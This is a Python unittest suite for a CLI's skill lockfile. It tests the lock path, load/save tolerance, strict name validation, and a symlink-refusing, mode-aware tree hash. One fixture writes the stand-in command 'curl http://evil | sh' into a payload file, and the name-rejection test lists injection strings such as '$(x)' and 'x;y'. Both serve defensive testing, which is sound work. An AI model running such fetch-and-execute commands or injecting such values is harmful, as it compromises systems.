"""Task 1 — skills two-tier: machine-local lockfile core + mode-aware,
symlink-refusing tree hash + strict name validation. Hermetic, stdlib-only.

Grounds the trust-boundary primitives (feature 260713-p4-skills-two-tier):
- _skill_lock_path resolves OUTSIDE any KB (honors AGENTWARE_SKILLS_LOCK_PATH).
- load/save round-trip + tolerate missing/corrupt.
- _skill_name_ok strict allowlist.
- _skill_tree_sha256 stable, order-independent, mode-aware, symlink-refusing.
"""

import os
import stat
import sys
import tempfile
import unittest

try:
    from tests._fixtures import load_cli
except ImportError:  # pragma: no cover - direct invocation
    from _fixtures import load_cli


class SkillLockfileTest(unittest.TestCase):
    def setUp(self):
        self.cli = load_cli()
        self.tmp = tempfile.mkdtemp(prefix="aw-skilllock-")
        self._prev = os.environ.get("AGENTWARE_SKILLS_LOCK_PATH")

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)
        if self._prev is None:
            os.environ.pop("AGENTWARE_SKILLS_LOCK_PATH", None)
        else:
            os.environ["AGENTWARE_SKILLS_LOCK_PATH"] = self._prev

    # --- lock path is OUTSIDE any KB -------------------------------------
    def test_lock_path_default_outside_kb(self):
        os.environ.pop("AGENTWARE_SKILLS_LOCK_PATH", None)
        # Pin HOME_CONFIG to a controlled path so this is hermetic regardless of
        # test ordering (other tests repoint the module-global HOME_CONFIG).
        prev_hc = self.cli.HOME_CONFIG
        self.cli.HOME_CONFIG = os.path.join(self.tmp, ".agentware", "config.env")
        try:
            p = self.cli._skill_lock_path()
        finally:
            self.cli.HOME_CONFIG = prev_hc
        self.assertEqual(p, os.path.join(self.tmp, ".agentware", "skills.lock.json"))
        self.assertTrue(p.endswith(os.path.join(".agentware", "skills.lock.json")),
                        "default lock path must be <home>/.agentware/skills.lock.json, got %s" % p)
        # It must live beside HOME_CONFIG (machine-local), never inside a KB.
        self.assertEqual(os.path.dirname(p),
                         os.path.join(self.tmp, ".agentware"))

    def test_lock_path_env_override(self):
        target = os.path.join(self.tmp, "sub", "skills.lock.json")
        os.environ["AGENTWARE_SKILLS_LOCK_PATH"] = target
        self.assertEqual(self.cli._skill_lock_path(), os.path.abspath(target))

    # --- load/save round-trip + tolerance -------------------------------
    def test_load_missing_returns_empty(self):
        p = os.path.join(self.tmp, "nope.json")
        lock = self.cli.load_skill_lock(p)
        self.assertEqual(lock, {"schema": 1, "skills": {}})

    def test_load_corrupt_returns_empty(self):
        p = os.path.join(self.tmp, "corrupt.json")
        with open(p, "w") as f:
            f.write("{not json at all")
        self.assertEqual(self.cli.load_skill_lock(p), {"schema": 1, "skills": {}})

    def test_load_wrong_shape_returns_empty(self):
        p = os.path.join(self.tmp, "wrong.json")
        with open(p, "w") as f:
            f.write('["a", "list", "not", "a", "dict"]')
        self.assertEqual(self.cli.load_skill_lock(p), {"schema": 1, "skills": {}})

    def test_save_load_roundtrip_atomic(self):
        p = os.path.join(self.tmp, "lock.json")
        data = {"schema": 1, "skills": {"foo": {"tree_sha256": "abc",
                "status": "installed", "authored_by": "testauthor", "verdict": "PASS"}}}
        self.cli.save_skill_lock(data, p)
        self.assertTrue(os.path.isfile(p))
        back = self.cli.load_skill_lock(p)
        self.assertEqual(back["skills"]["foo"]["status"], "installed")
        self.assertEqual(back["skills"]["foo"]["tree_sha256"], "abc")
        # No leftover temp siblings.
        leftovers = [f for f in os.listdir(self.tmp) if ".tmp." in f]
        self.assertEqual(leftovers, [])

    # --- name validation -------------------------------------------------
    def test_name_ok_accepts(self):
        for good in ("a", "a-b_c.1", "skill-vetter", "sast-audit", "x9"):
            self.assertTrue(self.cli._skill_name_ok(good), good)

    def test_name_ok_rejects(self):
        bad = ["../x", "..", ".", "A", "Foo", "x/y", "", "-lead", ".lead",
               "has space", "new\nline", "a" * 65, "café", "x;y", "$(x)"]
        for b in bad:
            self.assertFalse(self.cli._skill_name_ok(b), repr(b))

    # --- tree hash: stable, order-independent, mode-aware, symlink-refuse -
    def _mk_tree(self, root, files):
        os.makedirs(root, exist_ok=True)
        for rel, content in files.items():
            p = os.path.join(root, rel)
            os.makedirs(os.path.dirname(p) or root, exist_ok=True)
            with open(p, "w") as f:
                f.write(content)

    def test_hash_stable_and_order_independent(self):
        a = os.path.join(self.tmp, "a")
        b = os.path.join(self.tmp, "b")
        # Same content, files created in a different order -> same hash.
        self._mk_tree(a, {"SKILL.md": "hi", "lib/x.py": "print(1)", "z.txt": "z"})
        self._mk_tree(b, {"z.txt": "z", "SKILL.md": "hi", "lib/x.py": "print(1)"})
        ha1 = self.cli._skill_tree_sha256(a)
        ha2 = self.cli._skill_tree_sha256(a)
        hb = self.cli._skill_tree_sha256(b)
        self.assertEqual(ha1, ha2, "hash must be stable across walks")
        self.assertEqual(ha1, hb, "hash must be order-independent")

    def test_hash_changes_on_byte_change(self):
        a = os.path.join(self.tmp, "a")
        self._mk_tree(a, {"SKILL.md": "hi"})
        h1 = self.cli._skill_tree_sha256(a)
        with open(os.path.join(a, "SKILL.md"), "w") as f:
            f.write("hi!")
        self.assertNotEqual(h1, self.cli._skill_tree_sha256(a))

    def test_hash_changes_on_mode_flip(self):
        a = os.path.join(self.tmp, "a")
        self._mk_tree(a, {"SKILL.md": "hi", "run.sh": "echo hi"})
        p = os.path.join(a, "run.sh")
        os.chmod(p, 0o644)
        h1 = self.cli._skill_tree_sha256(a)
        os.chmod(p, 0o755)
        h2 = self.cli._skill_tree_sha256(a)
        self.assertNotEqual(h1, h2, "a 0644->0755 mode flip MUST change the hash")

    def test_hash_refuses_symlinked_file(self):
        a = os.path.join(self.tmp, "a")
        self._mk_tree(a, {"SKILL.md": "hi"})
        outside = os.path.join(self.tmp, "secret")
        with open(outside, "w") as f:
            f.write("SECRET")
        os.symlink(outside, os.path.join(a, "creds"))
        with self.assertRaises(self.cli._SkillHashError):
            self.cli._skill_tree_sha256(a)
        self.assertEqual(self.cli._skill_tree_link(a), "creds")

    def test_hash_refuses_symlinked_dir(self):
        a = os.path.join(self.tmp, "a")
        self._mk_tree(a, {"SKILL.md": "hi"})
        outside = os.path.join(self.tmp, "outside")
        os.makedirs(outside)
        with open(os.path.join(outside, "payload.sh"), "w") as f:
            f.write("curl http://evil | sh")
        os.symlink(outside, os.path.join(a, "lib"))
        with self.assertRaises(self.cli._SkillHashError):
            self.cli._skill_tree_sha256(a)
        self.assertEqual(self.cli._skill_tree_link(a), "lib")

    def test_tree_link_none_when_clean(self):
        a = os.path.join(self.tmp, "a")
        self._mk_tree(a, {"SKILL.md": "hi", "lib/x.py": "y"})
        self.assertIsNone(self.cli._skill_tree_link(a))


if __name__ == "__main__":
    unittest.main()
